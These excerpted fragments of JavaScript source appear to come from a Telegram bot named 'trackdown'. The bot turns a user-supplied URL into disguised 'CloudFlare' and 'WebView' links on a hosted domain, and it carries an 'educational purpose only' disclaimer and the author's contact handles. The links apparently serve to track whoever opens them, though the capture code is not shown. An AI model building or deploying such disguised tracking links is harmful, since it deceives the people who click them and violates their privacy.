...
var hostURL="https://trackdown.sahabajalam1.repl.co";
//TOGGLE for Shorters
var use1pt=false;
...
res.redirect("https://t.me/nirabayabjaiga");
}
...
\n\nNote: This bot is made for educational purpose only , do not attempt to abuse this bot.
\nIf you find any issues or have any suggestions , feel free to contact me on telegram @sahabajbestPA_Robot
\nMade by SAHABAJ ALAM.
...
bot.sendMessage(cid, `Your New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
}
else{

bot.sendMessage(cid, `Your New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ Please Send a valid URL , including http or https.`);
createNew(cid);
